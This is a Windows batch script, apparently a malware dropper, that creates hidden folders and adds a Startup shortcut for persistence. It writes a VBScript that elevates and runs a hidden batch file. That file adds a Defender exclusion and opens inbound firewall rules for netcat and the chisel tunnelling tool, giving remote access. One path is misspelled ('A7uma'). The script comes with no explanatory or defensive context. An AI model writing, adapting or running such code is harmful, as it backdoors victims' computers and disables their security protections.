@echo off
mkdir %homedrive%\Akuma
attrib +h %homedrive%\Akuma
mkdir %homedrive%\ShiniGami
attrib +h %homedrive%\ShiniGami
cd %homedrive%\ShiniGami
echo Set objShell = CreateObject("Shell.Application") >> %homedrive%\Akuma\beyondbirthday.vbs
echo objShell.ShellExecute "%homedrive%\Akuma\beyondbirthday.bat", "", "", "runas", 0 >> %homedrive%\Akuma\beyondbirthday.vbs
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%homedrive%\Akuma\beyondbirthday.vbs';$s.Save()"
echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma" >> %homedrive%\Akuma\beyondbirthday.bat
echo powershell Remove-NetFirewallRule -Name "Akumanc" >> %homedrive%\Akuma\beyondbirthday.bat
echo powershell New-NetFirewallRule -DisplayName "Akumanc" -Direction Inbound -Program "%homedrive%\Akuma\nc\nc.exe" -Action Allow >> %homedrive%\Akuma\beyondbirthday.bat
echo powershell Remove-NetFirewallRule -Name "Akumachisel" >> %homedrive%\Akuma\beyondbirthday.bat
echo powershell New-NetFirewallRule -DisplayName "Akumachisel" -Direction Inbound -Program "%homedrive%\Akuma\chisel.exe" -Action Allow >> %homedrive%\Akuma\beyondbirthday.bat
echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >> %homedrive%\Akuma\beyondbirthday.bat
echo del "beyondbirthday.lnk" >> %homedrive%\Akuma\beyondbirthday.bat
echo start %homedrive%\A7uma\Akuma.bat >> %homedrive%\Akuma\beyondbirthday.bat 
